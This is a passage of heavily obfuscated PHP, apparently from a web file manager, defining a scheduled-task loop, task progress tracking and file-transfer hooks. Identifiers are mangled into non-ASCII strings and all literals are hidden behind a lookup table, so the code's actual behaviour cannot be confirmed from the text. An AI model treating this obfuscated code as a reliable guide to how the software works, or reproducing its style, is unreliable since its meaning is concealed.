$»ÏÈ—šÓ =& $_SERVER[ê‘³Æ±]; $¹¡âŠ‰ = $»ÏÈ—šÓ[2082] . $º¡´«Û ; if (isset(self::$cacheChildList[$¹¡âŠ‰])) { return self::$cacheChildList[$¹¡âŠ‰]; } $Ó›Ï¾µë = array($»ÏÈ—šÓ[491] => intval($º¡´«Û ), $»ÏÈ—šÓ[424] => 0); $œÌêÂ­ = $this->where($Ó›Ï¾µë)->select(); $œÌêÂ­ = $œÌêÂ­ ? $œÌêÂ­ : array(); self::$cacheChildList[$¹¡âŠ‰] = $œÌêÂ­; foreach ($œÌêÂ­ as $¿–àÃœß) { $¹¡âŠ‰ = $»ÏÈ—šÓ[451] . $¿–àÃœß[$»ÏÈ—šÓ[396]]; self::$cacheSourceInfo[$¹¡âŠ‰] = $¿–àÃœß; } return $œÌêÂ­; } public function fileNameAuto($ì—˜ëÃõ, $—ì‹£Šü, $¾ÅŠËì = REPEAT_RENAME, $•øÓáš = false) { $¦ğÔÒ˜§ =& $_SERVER[ê‘³Æ±]; $èí¨ê›ñ = array($¦ğÔÒ˜§[491] => $ì—˜ëÃõ, $¦ğÔÒ˜§[424] => 0, $¦ğÔÒ˜§[32] => array($¦ğÔÒ˜§[380], $—ì‹£Šü . $¦ğÔÒ˜§[381])); $õÎ÷ŸÖ™ = $this->field($¦ğÔÒ˜§[32])->where($èí¨ê›ñ)->select(); $“Ô¬Õ = array_to_keyvalue($õÎ÷ŸÖ™, $¦ğÔÒ˜§[12], $¦ğÔÒ˜§[32]); return $this->fileNameAutoGet($“Ô¬Õ, $—ì‹£Šü, $¾ÅŠËì, $•øÓáš); } public function fileNameAutoGet($ïşÈÃÙÂ, $½£ªªÂú, $ó§À¬í, $æ…»ÆÜ) { $Õ›¦ß÷Ş =& $_SERVER[ê‘³Æ±]; if ($ó§À¬í == REPEAT_REPLACE || !$ïşÈÃÙÂ || !in_array_not_case($½£ªªÂú, $ïşÈÃÙÂ) || $æ…»ÆÜ && $ó§À¬í != REPEAT_RENAME_FOLDER) { return $½£ªªÂú; } if ($ó§À¬í == REPEAT_SKIP) { return !1; } $Ÿ‹©š¥­ = $Õ›¦ß÷Ş[10] . get_path_ext($½£ªªÂú); $Ÿ‹©š¥­ = $Ÿ‹©š¥­ == $Õ›¦ß÷Ş[10] || $æ…»ÆÜ ? $Õ›¦ß÷Ş[12] : $Ÿ‹©š¥­; for ($íÙÓ¯Ÿ = 1; $íÙÓ¯Ÿ <= count($ïşÈÃÙÂ) + 1; $íÙÓ¯Ÿ++) { $™Á¿—Ì = substr($½£ªªÂú, 0, strlen($½£ªªÂú) - strlen($Ÿ‹©š¥­)); $—§¨ Ñ¹ = $™Á¿—Ì . "\x28{$íÙÓ¯Ÿ}\x29{$Ÿ‹©š¥­}"; if (!in_array_not_case($—§¨ Ñ¹, $ïşÈÃÙÂ)) { return $—§¨ Ñ¹; } } } } goto aˆ—‹èö×ñ; FÜ˜¢‹àÒ„: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $±¼§ ¹û =& $_SERVER[ê‘³Æ±]; if (self::valueGet($±¼§ ¹û[736]) != $±¼§ ¹û[89]) { return; } if (self::valueGet($±¼§ ¹û[1601]) == $±¼§ ¹û[89]) { $‹‡²ØÒĞ = self::valueGet($±¼§ ¹û[1602]); if (time() - $‹‡²ØÒĞ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($±¼§ ¹û[1601], $±¼§ ¹û[89]); self::log($±¼§ ¹û[1603]); Hook::bind($±¼§ ¹û[1604], $±¼§ ¹û[1605]); $Õ’™¦Ç = 0; while (!0) { self::cacheClear(); if (self::valueGet($±¼§ ¹û[736]) != $±¼§ ¹û[89]) { self::valueSet($±¼§ ¹û[1601], $±¼§ ¹û[192]); self::log($±¼§ ¹û[1606]); die; } $ÔÅ¬èí = time(); if ($ÔÅ¬èí - $Õ’™¦Ç >= 60) { self::valueSet(array($±¼§ ¹û[1601] => $±¼§ ¹û[89], $±¼§ ¹û[1602] => $ÔÅ¬èí), !1); $Õ’™¦Ç = $ÔÅ¬èí; } if (!file_exists(USER_SYSTEM . $±¼§ ¹û[1607])) { self::valueSet(array($±¼§ ¹û[1601] => $±¼§ ¹û[192], $±¼§ ¹û[736] => $±¼§ ¹û[192]), !1); self::log($±¼§ ¹û[1608]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $â²üöú• =& $_SERVER[ê‘³Æ±]; http_close(); self::valueSet($â²üöú•[736], $â²üöú•[192]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($â²üöú•[1601] => $â²üöú•[192], $â²üöú•[736] => $â²üöú•[89]), !1); } public static function shutdownEvent() { $Ğä©ûÄ› =& $_SERVER[ê‘³Æ±]; self::valueSet($Ğä©ûÄ›[1601], $Ğä©ûÄ›[192]); self::log($Ğä©ûÄ›[1609]); } public static function config($Ê–”ƒ§Ğ, $¨ÍÇ½ü¦) { self::valueSet($_SERVER[ê‘³Æ±][736], $Ê–”ƒ§Ğ); } private static function taskRunAll() { $ÓĞÙ»¸ê =& $_SERVER[ê‘³Æ±]; $¨õíÍ˜ = timeFloat(); $Ÿôİ‹öÎ = Model($ÓĞÙ»¸ê[1610])->listData(); $×ÊŞíÚ‘ = count($Ÿôİ‹öÎ); for ($¶­Ş¬µú = 0; $¶­Ş¬µú < $×ÊŞíÚ‘; $¶­Ş¬µú++) { $€«†ÓÏö = $Ÿôİ‹öÎ[$¶­Ş¬µú]; if (!$€«†ÓÏö[$ÓĞÙ»¸ê[394]] || $€«†ÓÏö[$ÓĞÙ»¸ê[1611]] != $ÓĞÙ»¸ê[89]) { continue; } if (!self::taskTimeCheck($€«†ÓÏö)) { continue; } self::taskRun($€«†ÓÏö); } Hook::trigger($ÓĞÙ»¸ê[1612]); self::taskQueueRun($¨õíÍ˜); } private static function taskQueueRun($µ¯¥üÒ­) { $Ÿ¿Åá¶À = 10; while (!0) { $Ç€ì¹éÉ = TaskQueue::run(); if ($Ç€ì¹éÉ === !1) { break; } if (timeFloat() - $µ¯¥üÒ­ >= $Ÿ¿Åá¶À) { break; } } } private static function taskTimeCheck($¤ù½Ù¬) { $ˆ†àõ¬Ó =& $_SERVER[ê‘³Æ±]; $¡½¯’Ë = json_decode($¤ù½Ù¬[$ˆ†àõ¬Ó[198]], !0); $Œõºßàù = intval($¤ù½Ù¬[$ˆ†àõ¬Ó[1602]]); $É¾Ñ©î = strtotime($ˆ†àõ¬Ó[1613] . $¡½¯’Ë[$ˆ†àõ¬Ó[1614]] . $ˆ†àõ¬Ó[1615]) - strtotime($ˆ†àõ¬Ó[1616]); $Õ–Ë”Ïñ = time() - strtotime(date($ˆ†àõ¬Ó[1617]) . $ˆ†àõ¬Ó[1618]); $³÷â¼¤† = $Õ–Ë”Ïñ >= $É¾Ñ©î && $Õ–Ë”Ïñ <= $É¾Ñ©î + 3600; switch ($¡½¯’Ë[$ˆ†àõ¬Ó[33]]) { case $ˆ†àõ¬Ó[1619]: if (time() - $Œõºßàù < 3600 * 24 * 30) { return !1; } if ($¡½¯’Ë[$ˆ†àõ¬Ó[1619]] == date($ˆ†àõ¬Ó[1620]) && $³÷â¼¤†) { return !0; } break; case $ˆ†àõ¬Ó[1621]: if (time() - $Œõºßàù < 3600 * 24 * 7) { return !1; } $éŞ‹Å± = date($ˆ†àõ¬Ó[1622]) == 0 ? 7 : date($ˆ†àõ¬Ó[1622]); if ($¡½¯’Ë[$ˆ†àõ¬Ó[1621]] == $éŞ‹Å± && $³÷â¼¤†) { return !0; } break; case $ˆ†àõ¬Ó[1614]: if (time() - $Œõºßàù < 3600 * 24) { return !1; } if ($³÷â¼¤†) { return !0; } break; case $ˆ†àõ¬Ó[1623]: if (time() - $Œõºßàù >= floatval($¡½¯’Ë[$ˆ†àõ¬Ó[1623]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $éŸ‰½¡‚ =& $_SERVER[ê‘³Æ±]; static $ õÛÀŸ½ = 0; $ïÊŠÃ® = 300; if (!$ õÛÀŸ½) { $ õÛÀŸ½ = time(); } if (time() - $ õÛÀŸ½ < $ïÊŠÃ®) { return; } $ õÛÀŸ½ = time(); $ÎÍç„‡ = Model($éŸ‰½¡‚[506])->db($éŸ‰½¡‚[12]); if ($ÎÍç„‡) { $ÎÍç„‡->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($éŸ‰½¡‚[1624], $éŸ‰½¡‚[1625]); die; } } public static function taskRun($÷ÚˆÍğæ) { $øõ³©…ã =& $_SERVER[ê‘³Æ±]; self::log($øõ³©…ã[1626] . $÷ÚˆÍğæ[$øõ³©…ã[394]] . $øõ³©…ã[1627] . $÷ÚˆÍğæ[$øõ³©…ã[32]] . $øõ³©…ã[1628] . $÷ÚˆÍğæ[$øõ³©…ã[1629]]); Model($øõ³©…ã[1610])->run($÷ÚˆÍğæ[$øõ³©…ã[394]]); $ß®­Ÿ…Ù = timeFloat(); $â‡ğÁóã = $øõ³©…ã[12]; switch ($÷ÚˆÍğæ[$øõ³©…ã[33]]) { case $øõ³©…ã[304]: $¹ÙÄÌÛô = url_request($÷ÚˆÍğæ[$øõ³©…ã[1629]], $øõ³©…ã[227], !1, !1, !1, !1, 10); if ($¹ÙÄÌÛô[$øõ³©…ã[736]]) { $â‡ğÁóã = strlen($¹ÙÄÌÛô[$øõ³©…ã[1180]]); } break; case $øõ³©…ã[226]: $â‡ğÁóã = Hook::apply($÷ÚˆÍğæ[$øõ³©…ã[1629]]); default: break; } Model($øõ³©…ã[1630])->add(array($øõ³©…ã[1631] => $øõ³©…ã[12], $øõ³©…ã[1632] => $øõ³©…ã[192], $øõ³©…ã[33] => $øõ³©…ã[1633] . $÷ÚˆÍğæ[$øõ³©…ã[394]], $øõ³©…ã[1634] => json_encode(array($øõ³©…ã[32] => $÷ÚˆÍğæ[$øõ³©…ã[32]], $øõ³©…ã[1635] => timeFloat() - $ß®­Ÿ…Ù, $øõ³©…ã[290] => $â‡ğÁóã)))); $ÛìÓ™ô¹ = $â‡ğÁóã ? $øõ³©…ã[1636] . $â‡ğÁóã : $øõ³©…ã[12]; self::log($øõ³©…ã[1637] . $÷ÚˆÍğæ[$øõ³©…ã[394]] . $øõ³©…ã[529] . $ÛìÓ™ô¹); return !0; } private static function valueGet($µÇ©„) { $‰šı‘¬â =& $_SERVER[ê‘³Æ±]; $³É¡“‘¼ = $‰šı‘¬â[1638]; $¬ºà¾‰ = Model($‰šı‘¬â[426])->get($µÇ©„, $³É¡“‘¼); if (is_null($¬ºà¾‰)) { Model($‰šı‘¬â[426])->set($‰šı‘¬â[736], $‰šı‘¬â[89], $³É¡“‘¼); Model($‰šı‘¬â[426])->set($‰šı‘¬â[1601], $‰šı‘¬â[192], $³É¡“‘¼); $¬ºà¾‰ = Model($‰šı‘¬â[426])->get($µÇ©„, $³É¡“‘¼); } return $¬ºà¾‰; } private static function valueSet($•Ø±¸½, $ïÚÉÍ—à) { $é¢ª„Ç =& $_SERVER[ê‘³Æ±]; $˜îÌ‘¢ = $é¢ª„Ç[1639]; CacheLock::lock($˜îÌ‘¢); $ü»°Ãö = Model($é¢ª„Ç[426])->set($•Ø±¸½, $ïÚÉÍ—à, $é¢ª„Ç[1638]); CacheLock::unlock($˜îÌ‘¢); return $ü»°Ãö; } protected static function log($ã€º–) { write_log($ã€º–, $_SERVER[ê‘³Æ±][1625]); } private static function cacheClear() { $¶ çù‹ş =& $_SERVER[ê‘³Æ±]; Cache::clearMemory(Model($¶ çù‹ş[426])->cacheKey($¶ çù‹ş[1638])); Cache::clearMemory(Model($¶ çù‹ş[426])->cacheKey($¶ çù‹ş[1640])); Model($¶ çù‹ş[1610])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\162\165\156\x6e\x69\156\147"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($ÔÂ¤ƒ£Ï, $ÀÈõø©‚ = '', $í³İªë = 0, $ıÙúö¾Ò = '') { $î¦ñ„ò =& $_SERVER[ê‘³Æ±]; if (self::get($ÔÂ¤ƒ£Ï)) { return; } $this->task = array($î¦ñ„ò[394] => $ÔÂ¤ƒ£Ï, $î¦ñ„ò[1641] => USER_ID, $î¦ñ„ò[1541] => $ıÙúö¾Ò, $î¦ñ„ò[33] => $ÀÈõø©‚, $î¦ñ„ò[1053] => $î¦ñ„ò[12], $î¦ñ„ò[772] => $í³İªë, $î¦ñ„ò[1642] => 0, $î¦ñ„ò[1643] => 0, $î¦ñ„ò[1644] => 0, $î¦ñ„ò[1645] => timeFloat(), $î¦ñ„ò[1646] => 0, $î¦ñ„ò[1647] => 0, $î¦ñ„ò[1648] => 0, $î¦ñ„ò[1649] => 0, $î¦ñ„ò[736] => $î¦ñ„ò[1601]); $GLOBALS[$î¦ñ„ò[1650]] = 1; Hook::bind($î¦ñ„ò[1604], array($this, $î¦ñ„ò[1651])); Hook::bind($î¦ñ„ò[1652], array($this, $î¦ñ„ò[1653])); $this->startAfter(); Hook::trigger($î¦ñ„ò[1654], $this->task); $this->task[$î¦ñ„ò[1647]] = timeFloat(); } public function end() { $ÙÊ»¡™ =& $_SERVER[ê‘³Æ±]; if (!$this->task) { return; } if ($this->task[$ÙÊ»¡™[1647]]) { self::valueSet($this->task[$ÙÊ»¡™[394]], !1); } $‰ç† šÂ = timeFloat() - $this->task[$ÙÊ»¡™[1645]]; self::log($ÙÊ»¡™[1655] . $this->task[$ÙÊ»¡™[394]] . $ÙÊ»¡™[1656] . $‰ç† šÂ . $ÙÊ»¡™[1657]); Hook::unbind($ÙÊ»¡™[1604], array($this, $ÙÊ»¡™[1651])); Hook::unbind($ÙÊ»¡™[1652], array($this, $ÙÊ»¡™[1653])); $this->endAfter(); $this->task = !1; } public function update($Õ¡ºô± = 0, $€Ï÷„ — = false) { $¢ ¯³ÔÁ =& $_SERVER[ê‘³Æ±]; $¦òÓ¨¿¤ =& $this->task; if (!$¦òÓ¨¿¤) { return; } $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1642]] += $Õ¡ºô±; $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1646]] = timeFloat(); if ($¦òÓ¨¿¤[$¢ ¯³ÔÁ[772]]) { if ($¦òÓ¨¿¤[$¢ ¯³ÔÁ[772]] < $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1642]]) { $¦òÓ¨¿¤[$¢ ¯³ÔÁ[772]] = $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1642]]; } $„•şÏÉƒ = timeFloat() - $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1645]] - $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1648]]; $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1643]] = $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1642]] / $¦òÓ¨¿¤[$¢ ¯³ÔÁ[772]]; $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1644]] = $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1642]] / $„•şÏÉƒ; if ($¦òÓ¨¿¤[$¢ ¯³ÔÁ[1643]] > 0) { $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1649]] = $„•şÏÉƒ * (1 - $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1643]]) / $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1643]]; } $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1649]] = $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1649]] <= 0 ? 0 : $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1649]]; } $this->updateAfter(); $Ü·ÌÜóô = 0.2; if (timeFloat() - $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1647]] < $Ü·ÌÜóô && !$€Ï÷„ —) { return; } $‚àÕÍ  = self::get($¦òÓ¨¿¤[$¢ ¯³ÔÁ[394]]); $¾ÑØÊ«Ü = $‚àÕÍ [$¢ ¯³ÔÁ[736]]; if ($¾ÑØÊ«Ü == self::STATYS_KILL) { $”¿°™¨ = array($¢ ¯³ÔÁ[1658] => LNG($¢ ¯³ÔÁ[1659]), $¢ ¯³ÔÁ[1178] => !1); Cache::set($¢ ¯³ÔÁ[1660] . $this->task[$¢ ¯³ÔÁ[394]], $”¿°™¨, 30); $this->onKill(); $this->end(); die; } else { if ($¾ÑØÊ«Ü == self::STATYS_STOP) { $¢Ú²•Ú = 2; $‚àÕÍ [$¢ ¯³ÔÁ[1648]] += $¢Ú²•Ú; self::valueSet($¦òÓ¨¿¤[$¢ ¯³ÔÁ[394]], $‚àÕÍ ); sleep($¢Ú²•Ú); $this->update(); return; } } $¦òÓ¨¿¤[$¢ ¯³ÔÁ[736]] = $¾ÑØÊ«Ü ? $¾ÑØÊ«Ü : $¦òÓ¨¿¤[$¢ ¯³ÔÁ[736]]; $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1648]] = $‚àÕÍ [$¢ ¯³ÔÁ[1648]] ? $‚àÕÍ [$¢ ¯³ÔÁ[1648]] : 0; $¦òÓ¨¿¤[$¢ ¯³ÔÁ[1647]] = timeFloat(); Hook::trigger($¢ ¯³ÔÁ[1661], $¦òÓ¨¿¤); self::valueSet($¦òÓ¨¿¤[$¢ ¯³ÔÁ[394]], $¦òÓ¨¿¤); } public function onKillSet($Àãˆ‡×Ÿ, $”›ö¶ˆ® = array()) { $this->onKillCall = array($Àãˆ‡×Ÿ, $”›ö¶ˆ®); } public function onKill() { $Ğµş™¡’ =& $_SERVER[ê‘³Æ±]; self::log($Ğµş™¡’[1655] . $this->task[$Ğµş™¡’[394]] . $Ğµş™¡’[1662]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($óéÈĞı) { $‡Şû ¥É =& $_SERVER[ê‘³Æ±]; Cache::set($‡Şû ¥É[1660] . $this->task[$‡Şû ¥É[394]], $óéÈĞı, 60); return $óéÈĞı; } public static function get($è¯Û¶‘¢) { $È¤¢”‘ª =& $_SERVER[ê‘³Æ±]; $…ş€‡Ë¡ = self::valueGet($è¯Û¶‘¢); if (is_array($…ş€‡Ë¡) && $…ş€‡Ë¡[$È¤¢”‘ª[1663]]) { $ĞÀÖÒıà = ActionApply($…ş€‡Ë¡[$È¤¢”‘ª[1663]], array($…ş€‡Ë¡)); $…ş€‡Ë¡ = is_array($ĞÀÖÒıà) ? $ĞÀÖÒıà : $…ş€‡Ë¡; } return $…ş€‡Ë¡; } public static function listData() { $ÌãÓŞ§ƒ = self::valueGet(); return array_sort_by($ÌãÓŞ§ƒ, $_SERVER[ê‘³Æ±][1645], !0); } public static function kill($½µÙœôì) { return self::changeStatus($½µÙœôì, self::STATYS_KILL); } public static function stop($ûß³ªàŸ) { return self::changeStatus($ûß³ªàŸ, self::STATYS_STOP); } public static function restart($ãê—õ˜–) { return self::changeStatus($ãê—õ˜–, self::STATYS_RUNNING); } public static function killAll() { $¶¸Ø¾ı’ =& $_SERVER[ê‘³Æ±]; $ûÎØ„ = self::listData(); foreach ($ûÎØ„ as $¨ÅÒº¿) { self::kill($¨ÅÒº¿[$¶¸Ø¾ı’[394]]); } sleep(2); foreach ($ûÎØ„ as $¨ÅÒº¿) { self::valueSet($¨ÅÒº¿[$¶¸Ø¾ı’[394]], !1); } } private static function changeStatus($Š•šÙòì, $ºƒ†¢ÅÖ) { $‰Ÿ—ˆÕ =& $_SERVER[ê‘³Æ±]; $¬“‹®Ÿ = self::valueGet($Š•šÙòì); if (!$¬“‹®Ÿ) { return !1; } $¬“‹®Ÿ[$‰Ÿ—ˆÕ[736]] = $ºƒ†¢ÅÖ; self::valueSet($Š•šÙòì, $¬“‹®Ÿ); self::log($‰Ÿ—ˆÕ[1664] . $¬“‹®Ÿ[$‰Ÿ—ˆÕ[394]] . $‰Ÿ—ˆÕ[1665] . $ºƒ†¢ÅÖ); return !0; } public static function valueGet($£Ô÷§Õı = false) { $€Ô…ò‚Ã =& $_SERVER[ê‘³Æ±]; if ($£Ô÷§Õı) { $„ı±“ªĞ = Model($€Ô…ò‚Ã[438])->where(array($€Ô…ò‚Ã[95] => $£Ô÷§Õı, $€Ô…ò‚Ã[33] => $€Ô…ò‚Ã[1060]))->find(); return $„ı±“ªĞ ? json_decode($„ı±“ªĞ[$€Ô…ò‚Ã[371]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($±‚‚½Ğ = false) { $ÛªÇ–çØ =& $_SERVER[ê‘³Æ±]; $ŸşÃúºı = array($ÛªÇ–çØ[33] => $ÛªÇ–çØ[1060]); if ($±‚‚½Ğ) { $ŸşÃúºı[$ÛªÇ–çØ[1641]] = $±‚‚½Ğ; } $ĞŠç‰üŠ = Model($ÛªÇ–çØ[438])->where($ŸşÃúºı)->select(); $ĞŠç‰üŠ = $ĞŠç‰üŠ ? $ĞŠç‰üŠ : array(); foreach ($ĞŠç‰üŠ as $øÉ»«º› => $Õğï©‚º) { $ĞŠç‰üŠ[$øÉ»«º›] = json_decode($Õğï©‚º[$ÛªÇ–çØ[371]], !0); } return $ĞŠç‰üŠ; } public static function valueSet($ğàªµ¬Ó, $’Âşİ‰¬) { $³Äª°×¾ =& $_SERVER[ê‘³Æ±]; if (!$’Âşİ‰¬) { return Model($³Äª°×¾[438])->where(array($³Äª°×¾[95] => $ğàªµ¬Ó, $³Äª°×¾[33] => $³Äª°×¾[1060]))->delete(); } $…ù…’†³ = json_encode($’Âşİ‰¬); if (!$…ù…’†³) { ob_start(); var_dump($’Âşİ‰¬); $ıæÊ’¡€ = ob_get_clean(); self::log($³Äª°×¾[1666] . json_encode_force($ıæÊ’¡€)); } if (!$ğàªµ¬Ó || !$’Âşİ‰¬[$³Äª°×¾[394]]) { return !1; } $èÑÎÔÜõ = array($³Äª°×¾[33] => $³Äª°×¾[1060], $³Äª°×¾[1641] => USER_ID, $³Äª°×¾[95] => $ğàªµ¬Ó, $³Äª°×¾[371] => $…ù…’†³); $·È‚û³„ = $³Äª°×¾[1667]; CacheLock::lock($·È‚û³„); Model($³Äª°×¾[438])->add($èÑÎÔÜõ, array(), !0); CacheLock::unlock($·È‚û³„); } public static function log($Ã°İë²Ù) { if (!GLOBAL_DEBUG) { return; } write_log($Ã°İë²Ù, $_SERVER[ê‘³Æ±][1668]); } } class TaskFileTransfer extends Task { protected function startAfter() { $˜˜§ÉÊ =& $_SERVER[ê‘³Æ±]; $’©ÃÕ ¸ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($˜˜§ÉÊ[1669], array($this, $˜˜§ÉÊ[1670])); Hook::bind($˜˜§ÉÊ[1202], array($this, $˜˜§ÉÊ[1671])); Hook::bind($˜˜§ÉÊ[1672], array($this, $˜˜§ÉÊ[1673])); Hook::bind($˜˜§ÉÊ[594], array($this, $˜˜§ÉÊ[1674])); Hook::bind($˜˜§ÉÊ[595], array($this, $˜˜§ÉÊ[1675])); Hook::bind($˜˜§ÉÊ[597], array($this, $˜˜§ÉÊ[1676])); Hook::bind($˜˜§ÉÊ[598], array($this, $˜˜§ÉÊ[1676])); Hook::bind($˜˜§ÉÊ[564], array($this, $˜˜§ÉÊ[1677])); Hook::bind($˜˜§ÉÊ[561], array($this, $˜˜§ÉÊ[1677])); Hook::bind($˜˜§ÉÊ[566], array($this, $˜˜§ÉÊ[1677])); Hook::bind($˜˜§ÉÊ[568], array($this, $˜˜§ÉÊ[1677])); Hook::bind($˜˜§ÉÊ[570], array($this, $˜˜§ÉÊ[1677])); Hook::bind($˜˜§ÉÊ[1678], array($this, $˜˜§ÉÊ[1679])); Hook::bind($˜˜§ÉÊ[587], array($this, $˜˜§ÉÊ[1680])); $this->sourceModelCopyFlag = !1; Hook::bind($˜˜§ÉÊ[1681], array($this, $˜˜§ÉÊ[1682])); Hook::bind($˜˜§ÉÊ[1683], array($this, $˜˜§ÉÊ[1684])); Hook::bind($˜˜§ÉÊ[1685], array($this, $˜˜§ÉÊ[1686])); $’©ÃÕ ¸[$˜˜§ÉÊ[1687]] = LNG($˜˜§ÉÊ[1688]); $’©ÃÕ ¸[$˜˜§ÉÊ[1689]] = 0; $’©ÃÕ ¸[$˜˜§ÉÊ[1690]] = 0; $’©ÃÕ ¸[$˜˜§ÉÊ[1053]] = $˜˜§ÉÊ[12]; $’©ÃÕ ¸[$˜˜§ÉÊ[1691]] = $˜˜§ÉÊ[12]; $’©ÃÕ ¸[$˜˜§ÉÊ[1692]] = 0; $’©ÃÕ ¸[$˜˜§ÉÊ[1693]] = 0; $’©ÃÕ ¸[$˜˜§ÉÊ[1694]] = 0; if (!$’©ÃÕ ¸[$˜˜§ÉÊ[1541]]) { $’©ÃÕ ¸[$˜˜§ÉÊ[1541]] = LNG($˜˜§ÉÊ[1695]); } } protected function endAfter() { $§ŠÃ¶ÉŸ =& $_SERVER[ê‘³Æ±]; Hook::unbind($§ŠÃ¶ÉŸ[1669], array($this, $§ŠÃ¶ÉŸ[1670])); Hook::unbind($§ŠÃ¶ÉŸ[1202], array($this, $§ŠÃ¶ÉŸ[1671])); Hook::unbind($§ŠÃ¶ÉŸ[1672], array($this, $§ŠÃ¶ÉŸ[1673])); Hook::unbind($§ŠÃ¶ÉŸ[594], array($this, $§ŠÃ¶ÉŸ[1674])); Hook::unbind($§ŠÃ¶ÉŸ[595], array($this, $§ŠÃ¶ÉŸ[1675])); Hook::unbind($§ŠÃ¶ÉŸ[597], array($this, $§ŠÃ¶ÉŸ[1676])); Hook::unbind($§ŠÃ¶ÉŸ[598], array($this, $§ŠÃ¶ÉŸ[1676])); Hook::unbind($§ŠÃ¶ÉŸ[564], array($this, $§ŠÃ¶ÉŸ[1677])); Hook::unbind($§ŠÃ¶ÉŸ[561], array($this, $§ŠÃ¶ÉŸ[1677])); Hook::unbind($§ŠÃ¶ÉŸ[566], array($this, $§ŠÃ¶ÉŸ[1677])); Hook::unbind($§ŠÃ¶ÉŸ[568], array($this, $§ŠÃ¶ÉŸ[1677])); Hook::unbind($§ŠÃ¶ÉŸ[570], array($this, $§ŠÃ¶ÉŸ[1677])); Hook::unbind($§ŠÃ¶ÉŸ[1678], array($this, $§ŠÃ¶ÉŸ[1679])); Hook::unbind($§ŠÃ¶ÉŸ[587], array($this, $§ŠÃ¶ÉŸ[1680])); Hook::unbind($§ŠÃ¶ÉŸ[1681], array($this, $§ŠÃ¶ÉŸ[1682])); Hook::unbind($§ŠÃ¶ÉŸ[1683], array($this, $§ŠÃ¶ÉŸ[1684])); Hook::unbind($§ŠÃ¶ÉŸ[1685], array($this, $§ŠÃ¶ÉŸ[1686])); } public function copyMoveStart($èÄ¿ÜË·, $Ûı´’®, $é¼Å¾Åİ, $Õ¹³ı¹€) { $—ÂÌ“è¯ =& $_SERVER[ê‘³Æ±]; self::log($—ÂÌ“è¯[1696] . $Ûı´’® . $—ÂÌ“è¯[70] . $Õ¹³ı¹€); $¨Ã“¼´ï = rtrim(TEMP_FILES, $—ÂÌ“è¯[8]); if (substr($Ûı´’®, 0, strlen($¨Ã“¼´ï)) == $¨Ã“¼´ï) { return; } if (substr($Õ¹³ı¹€, 0, strlen($¨Ã“¼´ï)) == $¨Ã“¼´ï) { return; } $ªã×ï© =& $this->task; $ªã×ï©[$—ÂÌ“è¯[1697]] = KodIO::transferType($èÄ¿ÜË·, $é¼Å¾Åİ); $this->update(); } public function updateAfter() { $ÁÊ¢… =& $_SERVER[ê‘³Æ±]; $ÈÄ·¨æø =& $this->task; if (!$ÈÄ·¨æø[$ÁÊ¢…[749]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÈÄ·¨æø[$ÁÊ¢…[1697]] == $ÁÊ¢…[1291]) { return; } self::updateTask($ÈÄ·¨æø); } private static function updateTask(&$­úÖÓŞã) { $¼”©ßÜÅ =& $_SERVER[ê‘³Æ±]; if ($­úÖÓŞã[$¼”©ßÜÅ[1697]] == $¼”©ßÜÅ[1186] || $­úÖÓŞã[$¼”©ßÜÅ[1697]] == $¼”©ßÜÅ[108]) { if ($­úÖÓŞã[$¼”©ßÜÅ[1691]]) { $­úÖÓŞã[$¼”©ßÜÅ[1694]] = $­úÖÓŞã[$¼”©ßÜÅ[1693]] + $­úÖÓŞã[$¼”©ßÜÅ[1690]]; } } else { if ($­úÖÓŞã[$¼”©ßÜÅ[1697]] == $¼”©ßÜÅ[1292]) { if ($­úÖÓŞã[$¼”©ßÜÅ[1691]] == $¼”©ßÜÅ[1186]) { $­úÖÓŞã[$¼”©ßÜÅ[1694]] = $­úÖÓŞã[$¼”©ßÜÅ[1693]] + $­úÖÓŞã[$¼”©ßÜÅ[1690]] * 0.5; } else { if ($­úÖÓŞã[$¼”©ßÜÅ[1691]] == $¼”©ßÜÅ[108]) { $­úÖÓŞã[$¼”©ßÜÅ[1694]] = $­úÖÓŞã[$¼”©ßÜÅ[1693]] + $­úÖÓŞã[$¼”©ßÜÅ[1689]] * 0.5 + $­úÖÓŞã[$¼”©ßÜÅ[1690]] * 0.5; } } } } $­úÖÓŞã[$¼”©ßÜÅ[1643]] = $­úÖÓŞã[$¼”©ßÜÅ[1694]] / $­úÖÓŞã[$¼”©ßÜÅ[749]]; if ($­úÖÓŞã[$¼”©ßÜÅ[1643]] > 0) { $çüŸäã = timeFloat() - $­úÖÓŞã[$¼”©ßÜÅ[1645]] - $­úÖÓŞã[$¼”©ßÜÅ[1648]]; $­úÖÓŞã[$¼”©ßÜÅ[1649]] = $çüŸäã * (1 - $­úÖÓŞã[$¼”©ßÜÅ[1643]]) / 